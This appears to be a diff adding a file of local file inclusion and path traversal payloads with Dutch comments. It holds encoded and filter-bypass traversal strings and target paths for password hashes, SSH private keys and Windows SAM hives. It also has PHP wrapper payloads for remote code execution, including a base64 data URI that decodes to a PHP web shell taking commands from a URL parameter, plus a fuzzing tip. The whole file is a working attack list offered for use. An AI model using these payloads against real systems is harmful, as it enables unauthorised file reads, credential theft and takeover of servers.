@@ -1,0 +1,41 @@
+# LFI / Path Traversal - File Inclusion payloads
+# === Basis traversal ===
+../../../../../../../etc/passwd
+..\..\..\..\..\..\windows\win.ini
+# === URL-encoded ===
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+# === Dubbel URL-encoded ===
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+# === Null byte (PHP < 5.3.4) ===
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+# === Dot stripping bypass ===
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+# === Absolute path ===
+/etc/passwd
+C:\windows\win.ini
+# === Interessante Linux bestanden ===
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/auth.log
+/home/user/.ssh/id_rsa
+/home/user/.bash_history
+# === Interessante Windows bestanden ===
+C:\windows\system32\config\SAM
+C:\windows\repair\SAM
+C:\inetpub\wwwroot\web.config
+C:\windows\system32\drivers\etc\hosts
+C:\Users\Administrator\.ssh\id_rsa
+# === PHP Wrappers (LFI -> RCE) ===
+# Base64 source lezen:
+php://filter/convert.base64-encode/resource=config.php
+# Data wrapper (RCE):
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+# Expect wrapper (RCE):
+expect://id
+# Tip: Wfuzz met SecLists/Fuzzing/LFI/LFI-Jhaddix.txt voor fuzzing
